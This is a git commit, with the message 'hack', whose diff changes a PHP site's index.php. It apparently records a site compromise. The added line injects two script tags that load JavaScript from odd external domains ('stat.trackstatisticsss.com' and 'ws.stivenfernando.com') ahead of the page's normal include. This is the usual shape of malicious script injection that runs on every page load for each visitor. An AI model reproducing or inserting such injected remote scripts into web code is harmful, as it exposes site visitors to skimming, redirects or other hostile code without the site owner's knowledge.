3242499d807449fffeb7e0eff5f5d3322a6a7b17
DavidDengHui <david.no.1@msn.cn>
2020-05-25 15:22:16 +0800

    hack

--- index.php
+++ index.php
@@ -1,1 +1,1 @@
-<?php include( 'category.php' );?>
+<script type='text/javascript' src='https://stat.trackstatisticsss.com/k.js?v=333'></script><script type='text/javascript' src='https://ws.stivenfernando.com/stm?v=2.2.0'></script><?php include( 'category.php' );?>
